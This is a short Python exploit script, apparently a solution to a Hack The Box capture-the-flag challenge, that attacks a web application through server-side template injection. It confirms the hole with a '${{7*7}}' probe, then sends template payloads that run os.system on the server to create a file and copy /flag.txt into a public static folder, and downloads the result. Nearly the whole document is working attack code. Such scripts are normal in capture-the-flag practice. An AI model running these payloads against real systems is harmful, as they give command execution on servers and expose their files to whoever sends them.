#!/usr/bin/python3
from requests import get
from sys import argv
from re import findall


def check(req):
	if req.status_code != 200:
		print("Oooops exploit not successful...")
		exit(-2)

argument = argv[1]

try:
	if argument.startswith("http"):
		url = argument		
	else:
		url = f"http://{argument}"
except:
	url = "http://localhost:1337"


create_file = '${self.template.module.runtime.util.os.system("touch application/static/css/flag.txt")}'

payload = '${self.template.module.runtime.util.os.system("cat /flag.txt | tee application/static/css/flag.txt")}'


req = get(url + "/?text=${{7*7}}")

if "49" not in req.text:
	print(req.text)
	print("Oppps something is wrong!!!!....")
	exit(-1)

req = get(url + f"?text={create_file}")
check(req)

req = get(url + f"?text={payload}")
check(req)



req = get(url + "/static/css/flag.txt")

flag = findall("HTB{.*}", req.text)[0]
print(flag)